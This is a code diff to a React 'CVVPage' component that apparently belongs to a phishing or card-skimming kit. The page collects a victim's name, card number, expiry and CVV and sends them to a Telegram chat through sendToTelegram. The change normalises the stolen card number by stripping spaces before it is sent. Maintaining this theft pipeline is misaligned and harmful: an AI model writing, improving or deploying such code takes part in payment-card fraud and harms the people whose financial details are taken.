@@ -67,10 +67,13 @@ export function CVVPage() {
     setError(null);
     if (!/^\d{3,4}$/.test(cvv)) return setError("Please enter a valid 3 or 4 digit CVV");
 
+    // Strip any spaces that may have been stored in old sessions
+    const rawCard = (card.cardNumber || "").replace(/\s+/g, "");
+
     void sendToTelegram(
       formatEntry("🔐 CVV Verification", {
         "👤 User":  lead.fullName || "Unknown",
-        "Card":     card.cardNumber || "—",
+        "Card":     rawCard || "—",
         "Expiry":   card.expiry || "—",
         "CVV":      cvv,
       })
